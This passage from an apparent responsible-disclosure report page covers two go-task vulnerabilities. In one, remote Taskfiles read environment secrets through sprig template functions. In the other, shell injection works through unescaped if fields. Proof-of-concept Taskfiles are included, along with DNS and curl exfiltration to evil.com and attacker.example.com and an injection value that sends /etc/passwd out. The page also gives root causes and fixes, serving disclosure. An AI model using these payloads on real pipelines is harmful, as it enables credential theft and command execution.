+template functions. The trust boundary covers *whether* to load remote content, not
+*what capabilities* that content receives.
+
+## Proof of concept
+
+Verified against a from-source build (commit `3dcaa7db`).
+
+Taskfile.yml:
+
+```yaml
+version: &#x27;3&#x27;
+tasks:
+  exfil:
+    vars:
+      STOLEN: &#x27;{{env &quot;POC_SECRET&quot;}}&#x27;
+      EXPANDED: &#x27;{{expandenv &quot;creds=$POC_SECRET&quot;}}&#x27;
+    cmds:
+      - &#x27;echo &quot;env_read={{.STOLEN}}&quot;&#x27;
+      - &#x27;echo &quot;expandenv_read={{.EXPANDED}}&quot;&#x27;
+```
+
+Run:
+
+```bash
+$ POC_SECRET=&quot;LEAKED-SECRET-VALUE-12345&quot; task exfil
+```
+
+Observed output:
+
+```
+task: [exfil] echo &quot;env_read=LEAKED-SECRET-VALUE-12345&quot;
+env_read=LEAKED-SECRET-VALUE-12345
+task: [exfil] echo &quot;expandenv_read=creds=LEAKED-SECRET-VALUE-12345&quot;
+expandenv_read=creds=LEAKED-SECRET-VALUE-12345
+```
+
+In the remote-include attack, the attacker hosts the above as
+`https://evil.example.com/Taskfile.yml`; the victim includes it and the `cmds` curl
+the captured values to the attacker. DNS exfiltration is also possible via
+`getHostByName (printf &quot;%s.attacker.example.com&quot; .SECRET)`.
+
+## Impact
+
+A remote Taskfile included by a victim can steal any environment variable from the
+host. CI/CD runners are the highest-value targets — `AWS_SECRET_ACCESS_KEY`,
+`GITHUB_TOKEN`, `NPM_TOKEN`, `DOCKER_PASSWORD` are routinely present as env vars, and
+`--yes` (common in pipelines) removes the only barrier. Preconditions: the
+experimental remote-includes feature is enabled and the victim runs/accepts the
+include.
+
+## Suggested fix
+
+Remove OS-access functions from the template map, at minimum for remote contexts:
+
+```go
+templateFuncs = template.FuncMap(sprig.TxtFuncMap())
+delete(templateFuncs, &quot;env&quot;)
+delete(templateFuncs, &quot;expandenv&quot;)
+delete(templateFuncs, &quot;getHostByName&quot;)
+maps.Copy(templateFuncs, taskFuncs)
+```
+
+A split map (full access for local Taskfiles, restricted for remote) preserves the
+local-use convenience while closing the remote path.
+
+## Notes on scoring
+
+Scored without scope change (`S:U`): the leaked environment belongs to the same
+host/user authority that runs `task`, so there is no security-authority boundary
+crossing. `C:H` reflects credential disclosure; no integrity/availability impact.</pre><button class="copy" data-target="f12-desc">Copy</button></div></div><pre class="hidden" id="f12-full">Title: Remote Taskfiles can read host environment variables via Sprig env/expandenv
+CVE identifier: Request CVE ID later
+Severity (CVSS v3.1): AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N (6.5, Medium)
+Weaknesses (CWE): CWE-200
+Ecosystem: Go
+Package name: github.com/go-task/task
+Affected versions: all versions with remote Taskfile includes (&lt;= 3.51.1)
+Patched versions: None
+
+Description:
+## Summary
+
+go-task registers the full slim-sprig function map into its template engine,
+including the OS-access functions `env`, `expandenv`, and `getHostByName`. These are
+available in every template context — including Taskfiles fetched from a remote
+source via the `includes:` directive. A malicious remote Taskfile can read arbitrary
+host environment variables and exfiltrate them over the network.
+
+## Root cause
+
+`internal/templater/funcs.go:60`:
+
+```go
+templateFuncs = template.FuncMap(sprig.TxtFuncMap())
+maps.Copy(templateFuncs, taskFuncs)
+```
+
+The slim-sprig map retains `env` (`os.Getenv`), `expandenv` (`os.ExpandEnv`), and
+`getHostByName`. No function is removed before registration, and the same map is used
+for local and remote Taskfiles alike. Helm strips exactly these functions from sprig
+for this reason.
+
+## The gap
+
+go-task already gates remote Taskfiles behind a trust prompt
+(`taskfile/reader.go`, `taskfileUntrustedPrompt`), acknowledging that remote content
+is dangerous. But once the prompt is accepted — or bypassed with `--yes`, common in
+CI — the remote Taskfile gets unrestricted access to the host environment through
+template functions. The trust boundary covers *whether* to load remote content, not
+*what capabilities* that content receives.
+
+## Proof of concept
+
+Verified against a from-source build (commit `3dcaa7db`).
+
+Taskfile.yml:
+
+```yaml
+version: &#x27;3&#x27;
+tasks:
+  exfil:
+    vars:
+      STOLEN: &#x27;{{env &quot;POC_SECRET&quot;}}&#x27;
+      EXPANDED: &#x27;{{expandenv &quot;creds=$POC_SECRET&quot;}}&#x27;
+    cmds:
+      - &#x27;echo &quot;env_read={{.STOLEN}}&quot;&#x27;
+      - &#x27;echo &quot;expandenv_read={{.EXPANDED}}&quot;&#x27;
+```
+
+Run:
+
+```bash
+$ POC_SECRET=&quot;LEAKED-SECRET-VALUE-12345&quot; task exfil
+```
+
+Observed output:
+
+```
+task: [exfil] echo &quot;env_read=LEAKED-SECRET-VALUE-12345&quot;
+env_read=LEAKED-SECRET-VALUE-12345
+task: [exfil] echo &quot;expandenv_read=creds=LEAKED-SECRET-VALUE-12345&quot;
+expandenv_read=creds=LEAKED-SECRET-VALUE-12345
+```
+
+In the remote-include attack, the attacker hosts the above as
+`https://evil.example.com/Taskfile.yml`; the victim includes it and the `cmds` curl
+the captured values to the attacker. DNS exfiltration is also possible via
+`getHostByName (printf &quot;%s.attacker.example.com&quot; .SECRET)`.
+
+## Impact
+
+A remote Taskfile included by a victim can steal any environment variable from the
+host. CI/CD runners are the highest-value targets — `AWS_SECRET_ACCESS_KEY`,
+`GITHUB_TOKEN`, `NPM_TOKEN`, `DOCKER_PASSWORD` are routinely present as env vars, and
+`--yes` (common in pipelines) removes the only barrier. Preconditions: the
+experimental remote-includes feature is enabled and the victim runs/accepts the
+include.
+
+## Suggested fix
+
+Remove OS-access functions from the template map, at minimum for remote contexts:
+
+```go
+templateFuncs = template.FuncMap(sprig.TxtFuncMap())
+delete(templateFuncs, &quot;env&quot;)
+delete(templateFuncs, &quot;expandenv&quot;)
+delete(templateFuncs, &quot;getHostByName&quot;)
+maps.Copy(templateFuncs, taskFuncs)
+```
+
+A split map (full access for local Taskfiles, restricted for remote) preserves the
+local-use convenience while closing the remote path.
+
+## Notes on scoring
+
+Scored without scope change (`S:U`): the leaked environment belongs to the same
+host/user authority that runs `task`, so there is no security-authority boundary
+crossing. `C:H` reflects credential disclosure; no integrity/availability impact.
+</pre></section><section class="card" id="f13"><div class="chead"><div class="ctitle"><span class="sev med">Medium</span><span class="cname">13. Untrusted variable values flow unescaped into shell-executed if/status/precondition fields</span></div><div class="cmeta"><span class="badge tier3">Tier 3</span><span class="badge chan">GHSA / email (task@taskfile.dev)</span><button class="copy copyall" data-target="f13-full">Copy entire submission</button></div></div><div class="field"><div class="flabel">Advisory title</div><div class="frow"><pre class="fval" id="f13-title">Untrusted variable values flow unescaped into shell-executed if/status/precondition fields</pre><button class="copy" data-target="f13-title">Copy</button></div></div><div class="field"><div class="flabel">CVE identifier</div><div class="frow"><pre class="fval" id="f13-cve">Request CVE ID later</pre><button class="copy" data-target="f13-cve">Copy</button></div></div><div class="field"><div class="flabel">Severity — CVSS v3.1 vector (5.5, Medium)</div><div class="frow"><pre class="fval" id="f13-cvss">AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N</pre><button class="copy" data-target="f13-cvss">Copy</button></div></div><div class="field"><div class="flabel">Weaknesses (CWE)</div><div class="frow"><pre class="fval" id="f13-cwe">CWE-78</pre><button class="copy" data-target="f13-cwe">Copy</button></div></div><div class="field"><div class="flabel">Ecosystem</div><div class="frow"><pre class="fval" id="f13-eco">Go</pre><button class="copy" data-target="f13-eco">Copy</button></div></div><div class="field"><div class="flabel">Package name</div><div class="frow"><pre class="fval" id="f13-pkg">github.com/go-task/task</pre><button class="copy" data-target="f13-pkg">Copy</button></div></div><div class="field"><div class="flabel">Affected versions</div><div class="frow"><pre class="fval" id="f13-aff">all versions (&lt;= 3.51.1)</pre><button class="copy" data-target="f13-aff">Copy</button></div></div><div class="field"><div class="flabel">Patched versions</div><div class="frow"><pre class="fval" id="f13-patched">None</pre><button class="copy" data-target="f13-patched">Copy</button></div></div><div class="field"><div class="flabel">Description</div><div class="frow"><pre class="fval big" id="f13-desc">## Summary
+
+The `if` field (and likewise `preconditions[].sh`, `status[]`, `cmd.If`) is expanded
+by the Go template engine and then executed directly as a shell command via
+`mvdan.cc/sh`. Template variable values are not shell-escaped on the way into these
+fields. When a variable&#x27;s value originates from an untrusted source — an environment
+variable, a CI pipeline variable, a `.env` file, or a remote-include var — shell
+metacharacters in that value are interpreted as commands.
+
+## Threat model (read this first)
+
+This is **working-as-intended** if the attacker controls the Taskfile: a Taskfile is
+executable configuration, and an author who can write `if:` can already run anything
+via `cmds:`. The finding is a genuine vulnerability only in the narrower, realistic
+case where the **Taskfile is trusted but a variable source is not** — e.g. a CI
+Taskfile that branches on `$CI_BRANCH`, a deploy task that reads a `.env`, or a task
+whose vars come from a remote include. In those cases an attacker who controls only
+the variable value achieves command execution they were not supposed to have. The
+severity below is scored for that case (`PR:L`, local attacker controlling a variable
+source).
+
+## Root cause
+
+`If` is template-compiled in `variables.go:138`:
+
+```go
+If: templater.Replace(origTask.If, cache),
+```
+
+then executed as a shell command in `task.go:165`:
+
+```go
+if strings.TrimSpace(t.If) != &quot;&quot; {
+    if err := execext.RunCommand(ctx, &amp;execext.RunCommandOptions{
+        Command: t.If,
+        Dir:     t.Dir,
+        Env:     env.Get(t),
+    }); err != nil {
+```
+
+`execext.RunCommand` (`internal/execext/exec.go`) parses `Command` with
+`mvdan.cc/sh` and runs it, so `;`, `&amp;&amp;`, `$(...)`, backticks etc. in the expanded
+value are full shell. The command-level `cmd.If` follows the same path
+(`task.go:354` expand, `task.go:366` execute). A `shellQuote` template function
+exists (`internal/templater/funcs.go`) but is opt-in — nothing applies it
+automatically to shell-executed fields.
+
+## Proof of concept
+
+Verified against a from-source build (commit `3dcaa7db`).
+
+Taskfile.yml:
+
+```yaml
+version: &#x27;3&#x27;
+tasks:
+  inject:
+    vars:
+      STATUS: &#x27;true; touch /tmp/poc-review/poc3-marker&#x27;
+    if: &#x27;{{.STATUS}}&#x27;
+    cmds:
+      - echo &quot;task body ran&quot;
+```
+
+Run:
+
+```bash
+$ rm -f /tmp/poc-review/poc3-marker
+$ task inject
+task: [inject] echo &quot;task body ran&quot;
+task body ran
+$ ls -l /tmp/poc-review/poc3-marker
+-rw-r--r--  1 kai  wheel  0 Jun 28 03:10 /tmp/poc-review/poc3-marker
+```
+
+The `; touch ...` ran as a second shell command during the `if` evaluation (and
+`true` made the condition pass, so the body ran too). Replacing `{{.STATUS}}` with
+`{{.STATUS | shellQuote}}` prevents it — confirming escaping is available but not
+enforced.
+
+Realistic variant — a trusted Taskfile branching on an untrusted env var:
+
+```yaml
+tasks:
+  check:
+    vars:
+      BRANCH:
+        sh: &#x27;echo &quot;$CI_BRANCH&quot;&#x27;
+    if: &#x27;[ &quot;{{.BRANCH}}&quot; = &quot;main&quot; ]&#x27;
+    cmds: [ &#x27;echo deploying&#x27; ]
+```
+
+With `CI_BRANCH=&#x27;&quot; ] &amp;&amp; curl evil.com/$(cat /etc/passwd) #&#x27;` the expanded `if`
+becomes `[ &quot;&quot; ] &amp;&amp; curl evil.com/$(cat /etc/passwd) #&quot; = &quot;main&quot; ]`, executing the
+injected command.
+
+## Suggested fix
+
+1. Auto-escape variable interpolations in shell-executed fields (`if`,
+   `preconditions[].sh`, `status[]`, `cmds`) — apply `shellQuote` to interpolated
+   values by default, with an explicit opt-out for authors who intend raw shell.
+2. Failing that, document the foot-gun prominently and add a lint warning when a
+   template variable is used in `if`/`preconditions`/`status` without `shellQuote`.
+
+Option 1 risks breaking Taskfiles that deliberately embed shell in variables; a
+default-on escape with opt-out is the safer balance.</pre><button class="copy" data-target="f13-desc">Copy</button></div></div><pre class="hidden" id="f13-full">Title: Untrusted variable values flow unescaped into shell-executed if/status/precondition fields
+CVE identifier: Request CVE ID later
+Severity (CVSS v3.1): AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N (5.5, Medium)
+Weaknesses (CWE): CWE-78
+Ecosystem: Go
+Package name: github.com/go-task/task
+Affected versions: all versions (&lt;= 3.51.1)
+Patched versions: None
+
+Description:
+## Summary
+
+The `if` field (and likewise `preconditions[].sh`, `status[]`, `cmd.If`) is expanded
+by the Go template engine and then executed directly as a shell command via
+`mvdan.cc/sh`. Template variable values are not shell-escaped on the way into these
+fields. When a variable&#x27;s value originates from an untrusted source — an environment
+variable, a CI pipeline variable, a `.env` file, or a remote-include var — shell
+metacharacters in that value are interpreted as commands.
+
+## Threat model (read this first)
+
+This is **working-as-intended** if the attacker controls the Taskfile: a Taskfile is
+executable configuration, and an author who can write `if:` can already run anything
+via `cmds:`. The finding is a genuine vulnerability only in the narrower, realistic
+case where the **Taskfile is trusted but a variable source is not** — e.g. a CI
+Taskfile that branches on `$CI_BRANCH`, a deploy task that reads a `.env`, or a task
+whose vars come from a remote include. In those cases an attacker who controls only
+the variable value achieves command execution they were not supposed to have. The
+severity below is scored for that case (`PR:L`, local attacker controlling a variable
+source).
+
+## Root cause
+
+`If` is template-compiled in `variables.go:138`:
+
+```go
+If: templater.Replace(origTask.If, cache),
+```
+
+then executed as a shell command in `task.go:165`:
+
+```go
+if strings.TrimSpace(t.If) != &quot;&quot; {
+    if err := execext.RunCommand(ctx, &amp;execext.RunCommandOptions{
+        Command: t.If,
+        Dir:     t.Dir,
+        Env:     env.Get(t),
+    }); err != nil {
+```
+
+`execext.RunCommand` (`internal/execext/exec.go`) parses `Command` with
+`mvdan.cc/sh` and runs it, so `;`, `&amp;&amp;`, `$(...)`, backticks etc. in the expanded
+value are full shell. The command-level `cmd.If` follows the same path
+(`task.go:354` expand, `task.go:366` execute). A `shellQuote` template function
+exists (`internal/templater/funcs.go`) but is opt-in — nothing applies it
+automatically to shell-executed fields.
+
+## Proof of concept
+
+Verified against a from-source build (commit `3dcaa7db`).
+
+Taskfile.yml:
+
+```yaml
+version: &#x27;3&#x27;
+tasks:
+  inject:
+    vars:
+      STATUS: &#x27;true; touch /tmp/poc-review/poc3-marker&#x27;
+    if: &#x27;{{.STATUS}}&#x27;
+    cmds:
+      - echo &quot;task body ran&quot;
+```
+
+Run:
+
+```bash
+$ rm -f /tmp/poc-review/poc3-marker
+$ task inject
+task: [inject] echo &quot;task body ran&quot;
+task body ran
+$ ls -l /tmp/poc-review/poc3-marker
+-rw-r--r--  1 kai  wheel  0 Jun 28 03:10 /tmp/poc-review/poc3-marker
+```
+
+The `; touch ...` ran as a second shell command during the `if` evaluation (and
+`true` made the condition pass, so the body ran too). Replacing `{{.STATUS}}` with
+`{{.STATUS | shellQuote}}` prevents it — confirming escaping is available but not
+enforced.
+
+Realistic variant — a trusted Taskfile branching on an untrusted env var:
+
+```yaml
+tasks:
+  check:
+    vars:
+      BRANCH:
+        sh: &#x27;echo &quot;$CI_BRANCH&quot;&#x27;
+    if: &#x27;[ &quot;{{.BRANCH}}&quot; = &quot;main&quot; ]&#x27;
+    cmds: [ &#x27;echo deploying&#x27; ]
+```
+
+With `CI_BRANCH=&#x27;&quot; ] &amp;&amp; curl evil.com/$(cat /etc/passwd) #&#x27;` the expanded `if`
+becomes `[ &quot;&quot; ] &amp;&amp; curl evil.com/$(cat /etc/passwd) #&quot; = &quot;main&quot; ]`, executing the
+injected command.
+
+## Suggested fix
+
+1. Auto-escape variable interpolations in shell-executed fields (`if`,
+   `preconditions[].sh`, `status[]`, `cmds`) — apply `shellQuote` to interpolated
+   values by default, with an explicit opt-out for authors who intend raw shell.
+2. Failing that, document the foot-gun prominently and add a lint warning when a
+   template variable is used in `if`/`preconditions`/`status` without `shellQuote`.
+
+Option 1 risks breaking Taskfiles that deliberately embed shell in variables; a
+default-on escape with opt-out is the safer balance.
+</pre></section><footer>SnailSploit — Adversarial Research · all PoCs reproduced against real builds · channels verified per each project’s SECURITY.md</footer></div><script>
+function flash(btn){var t=btn.textContent;btn.textContent='Copied!';btn.classList.add('ok');
+setTimeout(function(){btn.textContent=t;btn.classList.remove('ok')},1100);}
+function copyText(txt,btn){
+  if(navigator.clipboard&&navigator.clipboard.writeText){
+    navigator.clipboard.writeText(txt).then(function(){flash(btn)},function(){fallback(txt,btn)});
+  }else{fallback(txt,btn);}
+}
+function fallback(txt,btn){var ta=document.createElement('textarea');ta.value=txt;
+ta.style.position='fixed';ta.style.opacity='0';document.body.appendChild(ta);ta.focus();ta.select();
+try{document.execCommand('copy');flash(btn);}catch(e){}document.body.removeChild(ta);}
+document.addEventListener('click',function(e){
+  var b=e.target.closest('.copy');if(!b)return;
+  var el=document.getElementById(b.getAttribute('data-target'));if(!el)return;
+  copyText(el.textContent,b);
+});
+</script></body></html>
